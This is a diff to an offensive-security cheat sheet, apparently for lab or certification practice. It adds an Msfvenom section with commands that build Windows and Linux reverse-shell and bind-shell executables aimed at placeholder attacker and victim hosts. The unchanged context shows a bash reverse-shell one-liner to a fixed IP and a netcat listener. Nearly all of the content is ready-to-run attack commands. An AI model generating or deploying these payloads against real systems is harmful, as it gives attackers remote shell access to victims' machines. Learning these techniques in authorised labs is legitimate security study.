@@ -55,6 +55,7 @@
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
 * [Webshell](#Webshell)
 * [ReverseShell](#ReverseShell)
+* [Msfvenom](#Msfvenom)
 * [Searchsploit](#Searchsploit)
 * [Exiftool](#Exiftool)
 * [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
@@ -717,6 +718,24 @@ nc -nvlp 4444
 ## Victim Connection
 ~~~ shell
 bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+~~~
+
+
+# Msfvenom
+
+## ReverseShell(Windows)
+~~~ bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f exe > reverseshell.exe
+~~~
+
+## BindShell(Linux)
+~~~ bash
+msfvenom -p linux/x64/shell_bind_tcp RHOST=victim.ip LPORT=4444 -f elf -o bindshell.elf
+~~~
+
+## ReverseShell(Linux)
+~~~ bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o reverseshell.elf
 ~~~
 
 
